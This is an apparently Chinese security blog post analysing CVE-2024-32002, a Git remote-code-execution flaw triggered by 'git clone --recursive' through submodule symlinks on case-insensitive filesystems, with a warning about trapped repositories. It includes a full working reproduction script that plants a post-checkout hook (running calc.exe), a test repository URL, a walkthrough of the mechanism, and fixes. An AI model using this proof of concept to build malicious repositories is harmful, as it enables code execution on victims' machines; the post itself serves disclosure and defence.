#  红蓝队已经开始布陷阱了，开源工具类别随意 git clone，一不小心就会直接触发 RCE   
原创 新青年1号  网安小趴菜   2024-07-04 17:32  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0cJxJdTeNgYmBxrqznNuicqBJXAnca9Sia5lw88xHj4O1j9nO8s5O484VI3HTMkaickZrAdRiboQOuYltpTibrXTn7Q/640?&random=0.2664965499058951&random=0.9085233162590856&random=0.8601061441893272&random=0.44602341188606287&random=0.24263858998624555&random=0.8342067371103399 "")  
  
今天，要说的这个漏洞，并不是最近的，它最早被发现于 5 月份，危害极大，热度却并不是很高。  
  
  
为什么今天我要把这个陈年旧洞拉出来说呢？  
  
  
是因为大家都知道，护网已经开始陆续进场了。  
  
  
红蓝队也都开始在开源平台上整理自己的工具类、部署陷阱了。  
  
  
近期，github 上频繁出现各种疑似红队上传的各种包含木马的“溯源”、“日志分析”工具，也有各种蓝队上传的处处透露着危险的 POC 利用工具。  
  
  
而这个漏洞......  
  
  
直接看动图效果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KzuCxpxs7oCB12IBPzSEmAib10AOjpmlWVZL5v1vUictokJWicLLBhqOXU7BPEGlda1qVTXElPiabEJqY3xXaqId6Q/640?&random=0.7091554334908987&random=0.21808440777750748&random=0.9320957187618146&random=0.7788544837546048&random=0.7174192398757093&random=0.1679058258514292 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/frODQ8JH4OMnKlxjVpx5HgU3NYOIpEvGv67WNuS1VsC2cTxY3PEmBLerltWJDQxru55o7dhNsK4jBYAIaj1SHg/640?wx_fmt=gif&from=appmsg&random=0.3485720942523358&random=0.200673690123357&random=0.616483650817824&random=0.956228644366397&random=0.1669342972699983&random=0.8579200677734999 "")  
  
  
感觉怎么样？  
  
不需要任何多余的操作  
  
仅仅一条 git clone 命令，就弹出了 calc  
  
  
  
看到这儿，你还敢随便在开源仓库上 clone 项目吗？  
  
这就是5 月份披露的 Git RCE 漏洞  
  
编号 CVE-2024-32002  
  
接下来，就仔细看一下这个漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icKqSso1xFnCKswBibrQ5PdkszaVbjF6MQk9qwoyKs5vEfWnj6EZrQfDIj4zly4FSlwdrFwbP6c1ezsjzWWNajXg/640?&random=0.18275265280105168&random=0.44245222347116453&random=0.7278987539422295&random=0.43259210879732013 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icKqSso1xFnCKswBibrQ5PdkszaVbjF6MQ7ls7kkqBg5TxqzzibRG4Ukf0urq3nRWIQqZ62MxhpDvENtH04fdARtg/640?&random=0.7050328289122831&random=0.9808134430081603&random=0.8999053791846798&random=0.8776795071048389 "")  
  
漏洞利用前提  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibOfZAXfkqIz0PYmkyNblWibzfnOaZy5DiaNknXDIW1lFQ3a86GwzDHHVEibzF1YhcgUiaN8WicxfqE12Jd3Ruutj6IQ/640?&random=0.1445169142874272&random=0.6324058974696898&random=0.239804432415188&random=0.5452997710258576 "")  
  
  
此洞的利用条件门槛可以说是相当的低。  
  
**条件1：Git 的符号链接配置开启**  
  
不得不提一句，在 Windows 环境中，默认 git 是关闭这个配置的（但是也不排除有人曾经打开过，毕竟这是个全局配置），但是，在 Mac 环境中，git 的这个配置是**默认开启**的。  
```
git config --global core.symlinks true
```  
  
**条件2：git clone 命令携带 --recursive 参数**  
  
这个参数，是递归 clone 的意思，也就是说，在一个 .git 的项目内如果还有其他 .git 项目，并且你想把它 clone 下来，就需要加这个参数。这个参数，不会很常用，但偶尔也会用到。  
  
最主要的是，你发给别人一个 git clone 命令，不管是开发，还是安全，很少有人会对这个命令产生怀疑的，即使它多了一个参数。  
  
  
因为命令本身没有任何问题，也没有管道符连接其他命令。一个合情合理的 clone 命令，谁又会想到它暗藏玄机呢？  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rL6zuS4YpOQ3Fiaon76KwsBNf1BrzAiaOeHHOo1dGWbrkYSS4vEW7d0IhOeDsWfOvCAcYib9xYuwW9JQa1ibaUMlVg/640?&random=0.9563340759517489&random=0.24992178612105254&random=0.43812621902612503 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icKqSso1xFnCKswBibrQ5PdkszaVbjF6MQk9qwoyKs5vEfWnj6EZrQfDIj4zly4FSlwdrFwbP6c1ezsjzWWNajXg/640?&random=0.18275265280105168&wx_fmt=png&random=0.03538457873543921&random=0.6392027890465715&random=0.3582314997997622 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icKqSso1xFnCKswBibrQ5PdkszaVbjF6MQ7ls7kkqBg5TxqzzibRG4Ukf0urq3nRWIQqZ62MxhpDvENtH04fdARtg/640?&random=0.7050328289122831&wx_fmt=png&random=0.7870633847200805&random=0.21301205962606562&random=0.5999226207069894 "")  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibOfZAXfkqIz0PYmkyNblWibzfnOaZy5DiaNknXDIW1lFQ3a86GwzDHHVEibzF1YhcgUiaN8WicxfqE12Jd3Ruutj6IQ/640?&random=0.1445169142874272&wx_fmt=png&random=0.10423193632706362&random=0.9616585239022319&random=0.8340047707911198 "")  
  
  
复现咱就在本地复现吧，要不然我怕你们到时候按照我的教程搞得 github 上全是恶意仓库，只弹 calc 也就罢了，万一再来两个马子，把我再送进去了...  
  
要是乐意玩儿的，用我这个测试的远程仓库地址试试就行，放心，只弹 calc，没别的伤害，但是要**保证符号链接全局开启**（就是上面的条件1）  
```
git clone --recursive https://github.com/AmbroseCdMeng/GoodTools.git
```  
  
  
本地 git 环境复现，打开 git bash 直接运行：  
```
git config --global core.symlinks true &&
  tell_tale_path="$PWD/tell.tale" &&
  git init hook &&
  (
    cd hook &&
    mkdir -p y/hooks &&
    cat > y/hooks/post-checkout <<-EOF &&
    #! /bin/bash
    calc.exe
    EOF
    git add y/hooks/post-checkout &&
    git commit -m post-checkout
  ) &&

  hook_repo_path="$(pwd)/hook" &&
  git init captain &&
  (
    cd captain &&
    git submodule add --name x/y "$hook_repo_path" A/modules/x &&
    git commit -m add-submodule &&

    printf .git >dotgit.txt &&
    git hash-object -w --stdin <dotgit.txt >dot-git.hash &&
    printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" >index.info &&
    git update-index --index-info <index.info &&
    git commit -m add-symlink
  ) &&

  
  git clone --recursive captain hooked
```  
  
   
  
这个复现的代码，当然不是我自己写的了，而是....  
  
从 git 官方的测试脚本里面扒拉过来的...  
  
  
参考链接：  
  
https://github.com/git/git/blob/master/t/t7406-submodule-update.sh  
  
  
大概在 1215 行左右，这个文件看上去是当时 git 官方修复完漏洞之后用来测试的一个脚本。  
  
  
复制下来之后改了几个方法，稍微对比一下就能看出来。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icKqSso1xFnCKswBibrQ5PdkszaVbjF6MQk9qwoyKs5vEfWnj6EZrQfDIj4zly4FSlwdrFwbP6c1ezsjzWWNajXg/640?&random=0.18275265280105168&wx_fmt=png&random=0.03538457873543921&random=0.23000727072814064&random=0.4093144385718306 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icKqSso1xFnCKswBibrQ5PdkszaVbjF6MQ7ls7kkqBg5TxqzzibRG4Ukf0urq3nRWIQqZ62MxhpDvENtH04fdARtg/640?&random=0.7050328289122831&wx_fmt=png&random=0.7870633847200805&random=0.01317338884796282&random=0.24227894460582644 "")  
  
漏洞原理  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibOfZAXfkqIz0PYmkyNblWibzfnOaZy5DiaNknXDIW1lFQ3a86GwzDHHVEibzF1YhcgUiaN8WicxfqE12Jd3Ruutj6IQ/640?&random=0.1445169142874272&wx_fmt=png&random=0.10423193632706362&random=0.17597604761668295&random=0.949891644473785 "")  
  
  
这个漏洞利用的就是 git 的 submodule  
  
也就是子模块。  
  
因为 git 本身是允许在 git 仓库内再嵌套多个 git 仓库的。  
  
它的大致原理  
  
就是先创建一个 git 仓库  
  
里面写入恶意代码  
  
然后创建一个正常仓库  
  
到这里，都是比较好理解的，我们直接看一下执行过程中仓库的结构图，来对比看一下变化  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OMnKlxjVpx5HgU3NYOIpEvGG3LacQnXHrurNv4R66tldSedTmf1xbByibk3Sn1eQgOrfNBSpIEKc1w/640?wx_fmt=png&from=appmsg&random=0.26339941343328444&random=0.7244774645057186 "")  
  
▲ 左半边是 captain 的结构，右半边是 hook 的结构  
  
可以看到：  
  
    captain 是一个非常正常的空 git 项目  
  
    hook 有过一次提交记录，里面包含一个 y/hooks/post-checkout 文件，这个文件其实就是我们的恶意文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fVgib7X1icAQR9wBb9Lgpn878QJQBU7IiadjKDicaibvTU3mC3lgnvFfcL5icNF6931FDbsibuiagXN2qMROPM6HSGsg2A/640?&random=0.4291213934802791 "")  
  

				  
  
 当执行 git submodule 命令时  
```
git submodule add --name x/y "$hook_repo_path" A/modules/x 
```  
  
结构就将发生第一次比较大的变化  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OMnKlxjVpx5HgU3NYOIpEvGM9HzKA5QiaOQ5wKFf9oCaibZFKQUp4KzXLUldJ38vRiaLnTyeLBP0N4HQ/640?wx_fmt=png&from=appmsg&random=0.39300032714980326 "")  
  
▲ 左边是 captain，右边是 hook  
  
  
可以看到：  
  
    captain 目录下多了一个 .gitmoudules 的配置文件，并且多了 A/modules/x/y/hooks/post-checkout 文件，这个文件，就是我们原本在 hook 仓库下的恶意文件，被当做子模块，加入到了 captain 的这个目录下。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fVgib7X1icAQR9wBb9Lgpn878QJQBU7IiadjKDicaibvTU3mC3lgnvFfcL5icNF6931FDbsibuiagXN2qMROPM6HSGsg2A/640?&wx_fmt=png&random=0.10700822721569869 "")  
  
  
而 .gitmoudules 配置文件中的内容，也能看出，这是一个子模块，来源于 hook 目录，目前保存在 captain 仓库的 A/modules/x 目录下，名为 x/y  
```
[submodule "x/y"]
  path = A/modules/x
  url = D:/Home/CVE/demo/hook
```  
  
继续往下看，接下来，创建了一个名为 dotgit.txt 的文件  
  
写入了一个 .git 的文本  
  
计算了它的 hash 值  
  
并且写入了 index.info 文件中  
  
index.info 是 git 更新索引过程中的文件，里面存储的是 git 对象的基本信息、文件类型、哈希、文件模式、文件位置等。  
  
  
它里面存储的内容是有固定格式的，每行的信息依次是：  
  
<模式> <哈希> <标志位> <路径>  
  
  
那么上面：  
  
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" >index.info  
  
  
这一行代码，就是在 index.info 中写入了一行  
  
120000 dot-git的hash 0 a  
  
  
其中 %s 是占位符，填充的是 dot-git.hash 的值，也就是上面计算出来那个  
  
\t 是制表符  
  
\n 是换行符  
  
  
120000 是符号链接的模式代码，同样的 100644 是普通文件；100755 是可执行文件。  
  
  
标志位通常都是 0，就不单独说了（其实我也不了解）。  
  
  
所以这一行的意思就是：  
  
    创建一个路径为 a 的符号索引，指向 .git 文件  
  

				  
  
 重点来了  
  
  
现在看，captain 的工作目录是这样的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OMnKlxjVpx5HgU3NYOIpEvG1FibmTwf1xg4tKVJ6iafmT2W9u2Pibtkwkxia2HIxDHYetYibuaiaOOQIhhg/640?wx_fmt=png&from=appmsg "")  
  
继续，执行了这一行更新索引之后  
```
git update-index --index-info <index.info
```  
  
现在，git 索引已经更新了，也就是说，里面有一条 a > .git 的映射关系了  
  
当执行 git clone --recursive xxx 时  
  
git 先会 clone 主仓库 captain 到本地，初始化 git 索引  
  
然后，根据主仓库的索引中子模块的位置 A/modules/x  
  
再初始化子模块  
  
但是  
  
由于子目录路径 A/modules/x  
  
恰好索引中又有 a -> .git  
  
在 Windows 和 Mac 这种大小写不敏感的系统中，系统会认为 A 和 a 是同一个目录  
  
于是，a 就会覆盖 A，直接指向 .git  
  
如此，在子模块初始化之后  
  
git 就会触发子模块中的钩子文件，也就是 hook 目录下的 post-checkout 文件  
  
从而触发命令执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icKqSso1xFnCKswBibrQ5PdkszaVbjF6MQk9qwoyKs5vEfWnj6EZrQfDIj4zly4FSlwdrFwbP6c1ezsjzWWNajXg/640?&random=0.18275265280105168&wx_fmt=png&random=0.03538457873543921&random=0.23000727072814064&random=0.4093144385718306 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icKqSso1xFnCKswBibrQ5PdkszaVbjF6MQ7ls7kkqBg5TxqzzibRG4Ukf0urq3nRWIQqZ62MxhpDvENtH04fdARtg/640?&random=0.7050328289122831&wx_fmt=png&random=0.7870633847200805&random=0.01317338884796282&random=0.24227894460582644 "")  
  
修复建议  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibOfZAXfkqIz0PYmkyNblWibzfnOaZy5DiaNknXDIW1lFQ3a86GwzDHHVEibzF1YhcgUiaN8WicxfqE12Jd3Ruutj6IQ/640?&random=0.1445169142874272&wx_fmt=png&random=0.10423193632706362&random=0.17597604761668295&random=0.949891644473785 "")  
  
  
目前，Git 官方已经修复该漏洞，具体的修复方案，  
参考  
  
2.44.0 与 2.44.1 版本的代码变更  
  
或者 2.45.0 与 2.45.1 代码的变更  
  
大致修改了这几处（还有一些其他小改动就不贴图了）  
  
1. 校验子模块的路径，不合法的直接退出程序  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OMnKlxjVpx5HgU3NYOIpEvGwlcib2P0pM27uspNtFHTmLUPdMEvRJ6rlWfgFTLicrqPDw8s8DHGHiaBw/640?wx_fmt=png&from=appmsg "")  
  
2. 创建子模块路径时跳过 . 和 .git 目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OMnKlxjVpx5HgU3NYOIpEvGAmmkDUtNLs9ONwcuWSMxGHlRw6k4uS07p1wiay9icSrhsvHIaicdAdUpw/640?wx_fmt=png&from=appmsg "")  
  
3. 克隆子模块时检查同名文件是否存在  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/frODQ8JH4OMnKlxjVpx5HgU3NYOIpEvG5h9ptRQwibgmhS6zo7EZXAU5fqS9RtXTibRbQA02nJrYnt5oOpzNvkKA/640?wx_fmt=png&from=appmsg "")  
  
但是对于我们普通用户来说，修复方式就更简单了  
  
1. 禁用 git 全局符  
号链接配置  
```
git config --global core.symlinks false
```  
  
2. 升级 git 至 2.44.1 或者 2.45.1 及以上版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zYxEsibHhhqHFXvQKic55dUSltLhKZhWS26N6nZiaz7TZhriaodk3GvvC5cnnSRwZR5f8TztGuKSBM7d2JMSl5iafcw/640?&random=0.5741366290652845&wx_fmt=png "")  
  
**结束，感谢阅读，如果您觉得本文对您有帮助，还请帮忙点个“在看”和“分享”，让更多的朋友看到它**  
  
****  
**如果您觉得写的不好，有什么建议或者指正，请留言或者私信我。**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/IwSh4vCvtCmAiahWWBCD6uVshNlbtsZxyBFdtQH49ia9feSkCyicQ3mgkNnn0DJR5ZYicTLj7IYQquYbqzXp3Y5HQA/640?&random=0.2537302570619444&wx_fmt=gif "")  
  
  
